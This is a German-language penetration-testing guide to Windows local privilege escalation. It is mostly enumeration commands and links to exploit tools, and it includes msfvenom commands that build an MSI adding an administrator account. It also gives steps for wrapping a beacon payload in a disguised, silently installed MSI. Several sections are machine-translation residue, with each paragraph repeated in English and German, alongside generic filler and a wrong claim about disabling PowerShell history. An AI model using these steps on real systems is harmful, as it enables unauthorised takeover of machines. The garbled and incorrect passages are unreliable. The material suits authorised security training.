# Windows Lokale Privilege Escalation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

### **Bestes Tool zur Suche nach Windows Local Privilege Escalation-Vektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Grundlagen der Windows-Theorie

### Zugriffstoken

**Wenn Sie nicht wissen, was Windows-Zugriffstoken sind, lesen Sie bitte die folgende Seite, bevor Sie fortfahren:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs finden Sie auf der folgenden Seite:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integritätsstufen

**Wenn Sie nicht wissen, was Integritätsstufen in Windows sind, sollten Sie die folgende Seite lesen, bevor Sie fortfahren:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **Sie daran hindern könnten, das System aufzulisten**, ausführbare Dateien auszuführen oder sogar **Ihre Aktivitäten zu erkennen**. Sie sollten die folgende **Seite lesen** und alle diese **Abwehrmechanismen** **vor Beginn der Privilege Escalation-Aufzählung** **aufzählen**:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Systeminformationen

### Versionsinformationen-Aufzählung

Überprüfen Sie, ob die Windows-Version bekannte Sicherheitslücken aufweist (überprüfen Sie auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitslücken zu suchen. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ist in Watson eingebettet)_

**Lokal mit Systeminformationen**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repositories für Exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Gibt es Anmeldeinformationen/Juicy-Informationen, die in den Umgebungsvariablen gespeichert sind?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell-Verlauf

PowerShell speichert den Verlauf der ausgeführten Befehle in einer Datei namens "ConsoleHost_history.txt". Diese Datei befindet sich normalerweise im Verzeichnis des Benutzerprofils unter "C:\Users\<Benutzername>\AppData\Roaming\Microsoft\Windows\PowerShell\".

Der PowerShell-Verlauf kann nützlich sein, um zu überprüfen, welche Befehle auf einem System ausgeführt wurden. Es kann auch verwendet werden, um wiederholte Befehle schnell abzurufen oder um zu überprüfen, ob ein Angreifer PowerShell für bösartige Zwecke verwendet hat.

Es ist wichtig zu beachten, dass der PowerShell-Verlauf standardmäßig aktiviert ist und sensible Informationen wie Passwörter oder vertrauliche Befehle enthalten kann. Daher ist es ratsam, den Verlauf regelmäßig zu überprüfen und sicherzustellen, dass keine vertraulichen Informationen darin enthalten sind.

Um den PowerShell-Verlauf zu deaktivieren, kann die Umgebungsvariable "HISTFILE" auf einen anderen Wert als "ConsoleHost_history.txt" gesetzt werden. Alternativ kann der Verlauf auch durch Löschen der "ConsoleHost_history.txt"-Datei oder durch Ändern der Berechtigungen für die Datei deaktiviert werden.

Um den PowerShell-Verlauf anzuzeigen, kann der Befehl "Get-History" verwendet werden. Dies zeigt eine Liste der ausgeführten Befehle zusammen mit einer eindeutigen ID an. Um einen bestimmten Befehl aus dem Verlauf abzurufen, kann der Befehl "Invoke-History -ID <ID>" verwendet werden, wobei "<ID>" durch die entsprechende ID des Befehls ersetzt wird.

Es gibt auch Tools und Techniken, um den PowerShell-Verlauf zu manipulieren oder zu löschen. Angreifer können versuchen, den Verlauf zu entfernen, um ihre Spuren zu verwischen. Daher ist es wichtig, den Verlauf regelmäßig zu überprüfen und geeignete Sicherheitsmaßnahmen zu ergreifen, um den Verlauf vor unbefugtem Zugriff zu schützen.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Sie können lernen, wie Sie dies aktivieren, unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell-Modulprotokollierung

Details zu PowerShell-Pipeline-Ausführungen werden erfasst, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Es ist jedoch möglich, dass nicht alle Ausführungsdetails und Ausgabenergebnisse erfasst werden.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transkriptdateien" der Dokumentation und wählen Sie **"Modulprotokollierung"** anstelle von **"PowerShell-Transkription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowerShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Skriptausführung wird erfasst, um sicherzustellen, dass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess ermöglicht eine umfassende Überwachung jeder Aktivität, die für forensische Untersuchungen und die Analyse von bösartigem Verhalten wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Protokolle für die Skriptblockierung können im Windows-Ereignisprotokoll unter dem Pfad **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational** gefunden werden.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen

#### Proxy Settings

#### Proxy-Einstellungen

Proxy settings can be configured in the Internet Options dialog box. To access this dialog box, open the Control Panel and search for "Internet Options". In the Internet Options dialog box, go to the Connections tab and click on the "LAN settings" button.

Proxy-Einstellungen können im Dialogfeld "Internetoptionen" konfiguriert werden. Um auf dieses Dialogfeld zuzugreifen, öffnen Sie die Systemsteuerung und suchen Sie nach "Internetoptionen". In dem Dialogfeld "Internetoptionen" wechseln Sie zum Tab "Verbindungen" und klicken Sie auf die Schaltfläche "LAN-Einstellungen".

In the LAN settings, you can configure a proxy server for your internet connection. You can either use a proxy server for your LAN or specify a proxy server for your dial-up or VPN connection. You can also bypass proxy settings for local addresses or configure advanced proxy settings.

In den LAN-Einstellungen können Sie einen Proxy-Server für Ihre Internetverbindung konfigurieren. Sie können entweder einen Proxy-Server für Ihr LAN verwenden oder einen Proxy-Server für Ihre Einwahl- oder VPN-Verbindung angeben. Sie können auch Proxy-Einstellungen für lokale Adressen umgehen oder erweiterte Proxy-Einstellungen konfigurieren.

#### Firewall Settings

#### Firewall-Einstellungen

Firewall settings can be configured in the Windows Defender Firewall dialog box. To access this dialog box, open the Control Panel and search for "Windows Defender Firewall". In the Windows Defender Firewall dialog box, go to the "Advanced settings" option.

Firewall-Einstellungen können im Dialogfeld "Windows Defender Firewall" konfiguriert werden. Um auf dieses Dialogfeld zuzugreifen, öffnen Sie die Systemsteuerung und suchen Sie nach "Windows Defender Firewall". In dem Dialogfeld "Windows Defender Firewall" wählen Sie die Option "Erweiterte Einstellungen".

In the Advanced settings, you can configure inbound and outbound rules for the firewall. You can allow or block specific programs or ports, create custom rules, and configure network profiles for different types of networks.

In den erweiterten Einstellungen können Sie eingehende und ausgehende Regeln für die Firewall konfigurieren. Sie können bestimmte Programme oder Ports zulassen oder blockieren, benutzerdefinierte Regeln erstellen und Netzwerkprofile für verschiedene Arten von Netzwerken konfigurieren.

#### Windows Update Settings

#### Windows Update-Einstellungen

Windows Update settings can be configured in the Windows Update dialog box. To access this dialog box, open the Control Panel and search for "Windows Update". In the Windows Update dialog box, click on the "Change settings" option.

Windows Update-Einstellungen können im Dialogfeld "Windows Update" konfiguriert werden. Um auf dieses Dialogfeld zuzugreifen, öffnen Sie die Systemsteuerung und suchen Sie nach "Windows Update". In dem Dialogfeld "Windows Update" klicken Sie auf die Option "Einstellungen ändern".

In the Change settings, you can configure how Windows updates are installed on your computer. You can choose to install updates automatically, download updates but let me choose whether to install them, check for updates but let me choose whether to download and install them, or never check for updates.

In den Einstellungen können Sie konfigurieren, wie Windows-Updates auf Ihrem Computer installiert werden. Sie können wählen, ob Updates automatisch installiert werden, Updates heruntergeladen werden, aber Sie entscheiden, ob Sie sie installieren möchten, nach Updates suchen, aber Sie entscheiden, ob Sie sie herunterladen und installieren möchten, oder ob nie nach Updates gesucht werden soll.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke

---

#### Introduction

In Windows, drives are used to store and organize data. Each drive is assigned a letter, such as C:, D:, etc. Understanding how drives work is essential for performing various tasks, including local privilege escalation.

#### Types of Drives

There are several types of drives in Windows:

- **Local Drives**: These are physical drives directly connected to the computer, such as hard disk drives (HDD) or solid-state drives (SSD).

- **Network Drives**: These are drives that are connected to a network and can be accessed by multiple computers. They are assigned a letter just like local drives.

- **Virtual Drives**: These are drives that are created by software and are not physically connected to the computer. They can be used to mount disk images or create virtual storage.

#### Drive Letters

Drive letters are used to identify and access drives in Windows. The most commonly used drive letters are C:, D:, and E:. The C: drive is typically used for the operating system, while additional drives are used for storing data.

#### Mount Points

In addition to drive letters, Windows also supports mount points. A mount point is a folder on an NTFS volume that is used as a root directory for another volume. This allows you to access the contents of one drive through a folder on another drive.

#### Conclusion

Understanding the different types of drives and how they are accessed in Windows is crucial for performing various tasks, including local privilege escalation. By gaining knowledge of the drives and their configurations, you can effectively navigate the file system and exploit vulnerabilities to escalate privileges.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Sie beginnen, indem Sie überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes ausführen:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Wenn Sie eine Antwort wie die folgende erhalten:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gleich `1` ist.

Dann **ist es ausnutzbar**. Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS](https://github.com/GoSecure/pywsus) verwenden. Diese sind MiTM-Waffen-Exploit-Skripte, um "gefälschte" Updates in nicht-SSL-WSUS-Verkehr einzuspritzen.

Lesen Sie die Forschung hier:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lesen Sie hier den vollständigen Bericht**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Grundsätzlich handelt es sich bei diesem Fehler um die Schwachstelle, die dieser Fehler ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern und Windows Updates den in den Einstellungen des Internet Explorers konfigurierten Proxy verwendet, haben wir die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Datenverkehr abzufangen und Code als erhöhter Benutzer auf unserem Gerät auszuführen.
>
> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers und verwendet auch dessen Zertifikatsspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname generieren und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-First-Use-Typ-Validierung des Zertifikats durchzuführen. Wenn das vorgelegte Zertifikat vom Benutzer vertrauenswürdig ist und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## KrbRelayUp

In Windows **Domänen**-Umgebungen besteht eine Schwachstelle für **lokale Privilegieneskalation** unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP-Signierung nicht erzwungen wird**, Benutzer über Selbstrechte verfügen, die es ihnen ermöglichen, **ressourcenbasierte eingeschränkte Delegation (RBCD)** zu konfigurieren, und die Möglichkeit für Benutzer, Computer in der Domäne zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit den **Standard-Einstellungen** erfüllt werden.

Finden Sie den Exploit in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit-Payloads

Metasploit-Payloads sind die eigentlichen Nutzlasten, die von Metasploit verwendet werden, um Schwachstellen in Zielsystemen auszunutzen. Diese Payloads ermöglichen es einem Angreifer, die Kontrolle über das Zielsystem zu erlangen und verschiedene Aktionen auszuführen, wie z.B. das Erhöhen von Berechtigungen, das Ausführen von Befehlen oder das Herunterladen und Ausführen von Dateien.

Metasploit bietet eine Vielzahl von Payloads, die je nach den spezifischen Anforderungen des Angriffs ausgewählt werden können. Einige der gängigsten Metasploit-Payloads sind:

- `reverse_tcp`: Diese Payload öffnet eine Verbindung zum Angreifer und ermöglicht es diesem, Befehle an das Zielsystem zu senden.
- `bind_tcp`: Diese Payload öffnet einen Port auf dem Zielsystem und wartet auf eine Verbindung vom Angreifer.
- `meterpreter`: Diese Payload bietet eine umfangreiche Funktionalität und ermöglicht es dem Angreifer, eine interaktive Shell auf dem Zielsystem zu öffnen.

Es ist wichtig zu beachten, dass Metasploit-Payloads oft mit Exploits kombiniert werden, um Schwachstellen auszunutzen und Zugriff auf das Zielsystem zu erlangen. Die Auswahl des richtigen Payloads hängt von verschiedenen Faktoren ab, wie z.B. dem Zielsystem, der Art der Schwachstelle und den gewünschten Aktionen.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUp, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zur Eskalation von Berechtigungen zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/Gruppe auffordert (daher benötigen Sie GUI-Zugriff):
```
Write-UserAddMSI
```
Führen Sie die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lesen Sie dieses Tutorial, um zu lernen, wie Sie einen MSI-Wrapper mit diesem Tool erstellen. Beachten Sie, dass Sie eine "**.bat**"-Datei einwickeln können, wenn Sie nur Befehlszeilen ausführen möchten.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Erstellen Sie MSI mit WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Erstellen Sie MSI mit Visual Studio

* Generieren Sie mit Cobalt Strike oder Metasploit eine neue Windows EXE TCP-Payload-Datei unter `C:\privesc\beacon.exe`.
* Öffnen Sie **Visual Studio**, wählen Sie **Ein neues Projekt erstellen** und geben Sie "Installer" in das Suchfeld ein. Wählen Sie das Projekt **Setup-Assistent** aus und klicken Sie auf **Weiter**.
* Geben Sie dem Projekt einen Namen, z.B. **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** als Speicherort, wählen Sie **Lösung und Projekt im selben Verzeichnis platzieren** aus und klicken Sie auf **Erstellen**.
* Klicken Sie immer wieder auf **Weiter**, bis Sie zu Schritt 3 von 4 (Dateien zum Einbinden auswählen) gelangen. Klicken Sie auf **Hinzufügen** und wählen Sie die gerade generierte Beacon-Payload aus. Klicken Sie dann auf **Fertig stellen**.
* Markieren Sie das Projekt **AlwaysPrivesc** im **Lösungs-Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
* Es gibt weitere Eigenschaften, die Sie ändern können, wie z.B. **Author** und **Manufacturer**, um die installierte App authentischer aussehen zu lassen.
* Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
* Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
* Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dadurch wird sichergestellt, dass die Beacon-Payload sofort ausgeführt wird, sobald der Installer gestartet wird.
* Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** in **True**.
* Klicken Sie schließlich auf **Erstellen**.
* Wenn die Warnung "Datei 'beacon-tcp.exe', die auf 'x64' abzielt, ist nicht mit der Zielplattform des Projekts 'x86' kompatibel" angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 festlegen.

### MSI-Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie Folgendes verwenden: _exploit/windows/local/always\_install\_elevated_

## Antivirus und Detektoren

### Überprüfungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, daher sollten Sie darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding (WEF) ist interessant, um herauszufinden, wohin die Protokolle gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für das **Management der lokalen Administratorpasswörter** konzipiert und stellt sicher, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **eindeutig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden, um lokale Administratorpasswörter anzuzeigen, wenn sie autorisiert sind.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Wenn aktiviert, werden **Klartextpasswörter im LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** von nicht vertrauenswürdigen Prozessen zu **blockieren**, auf den Speicher zuzugreifen oder Code einzuspritzen und das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz finden Sie hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck besteht darin, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen.
[**Weitere Informationen zu Credentials Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldeinformationen für den Benutzer erstellt.\
[**Weitere Informationen zu zwischengespeicherten Anmeldeinformationen finden Sie hier**](../stealing-credentials/credentials-protections.md#zwischengespeicherte-anmeldeinformationen).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Sie sollten überprüfen, ob eine der Gruppen, zu denen Sie gehören, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn Sie **einer privilegierten Gruppe angehören, können Sie möglicherweise Privilegien eskalieren**. Erfahren Sie hier mehr über privilegierte Gruppen und wie Sie sie missbrauchen können, um Privilegien zu eskalieren:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token-Manipulation

**Erfahren Sie mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Schauen Sie sich die folgende Seite an, um mehr über interessante Tokens zu erfahren und wie Sie sie missbrauchen können:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Homeverzeichnisse

In Windows, each user has a home folder that contains their personal files and settings. These home folders are located in the `C:\Users` directory. By default, only the user who owns the home folder has full access to it.

#### Permissions

The permissions on home folders are set to restrict access to other users on the system. However, there are certain scenarios where misconfigurations or vulnerabilities can allow unauthorized access to these folders.

#### Privilege Escalation

If an attacker gains access to a user's home folder, they can potentially escalate their privileges and gain control over the system. This can be achieved by exploiting vulnerabilities in the user's applications or by leveraging misconfigurations in the system.

#### Mitigation

To mitigate the risk of privilege escalation through home folders, it is important to ensure that proper permissions are set on these folders. Only the user who owns the home folder should have full access, while other users should have limited or no access.

Regularly monitoring and auditing the permissions on home folders can help identify any unauthorized access or misconfigurations. Additionally, keeping the system and applications up to date with the latest security patches can help prevent exploitation of vulnerabilities.

#### Conclusion

Home folders in Windows can be a potential target for privilege escalation attacks. By properly configuring and monitoring the permissions on these folders, the risk of unauthorized access can be minimized.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie

Eine starke Passwortrichtlinie ist entscheidend, um die Sicherheit eines Windows-Systems zu gewährleisten. Hier sind einige bewährte Methoden, um eine effektive Passwortrichtlinie umzusetzen:

- **Passwortkomplexität**: Stellen Sie sicher, dass Passwörter mindestens eine Mindestlänge haben und eine Kombination aus Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen enthalten.
- **Passwortalter**: Erzwingen Sie das regelmäßige Ändern von Passwörtern, um zu verhindern, dass Benutzer dasselbe Passwort über einen längeren Zeitraum verwenden.
- **Passworthistorie**: Verbieten Sie die Verwendung von Passwörtern, die bereits zuvor verwendet wurden, um die Wiederverwendung von Passwörtern zu verhindern.
- **Kontosperrung**: Legen Sie eine maximale Anzahl von fehlgeschlagenen Anmeldeversuchen fest, nach der ein Konto vorübergehend gesperrt wird, um Brute-Force-Angriffe zu verhindern.
- **Passwortrichtlinien durchsetzen**: Stellen Sie sicher, dass die Passwortrichtlinie auf allen Windows-Systemen durchgesetzt wird, indem Sie Gruppenrichtlinien verwenden.

Eine effektive Passwortrichtlinie ist ein wichtiger Schritt, um die Sicherheit von Windows-Systemen zu erhöhen und das Risiko von Passwortangriffen zu verringern.
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen

Um den Inhalt der Zwischenablage abzurufen, können Sie die folgenden Schritte ausführen:

1. Öffnen Sie das Startmenü und suchen Sie nach "Eingabeaufforderung".
2. Klicken Sie mit der rechten Maustaste auf "Eingabeaufforderung" und wählen Sie "Als Administrator ausführen".
3. Geben Sie den folgenden Befehl ein und drücken Sie die Eingabetaste:

   ```plaintext
   powershell Get-Clipboard
   ```

   Dadurch wird der Inhalt der Zwischenablage in der Eingabeaufforderung angezeigt.

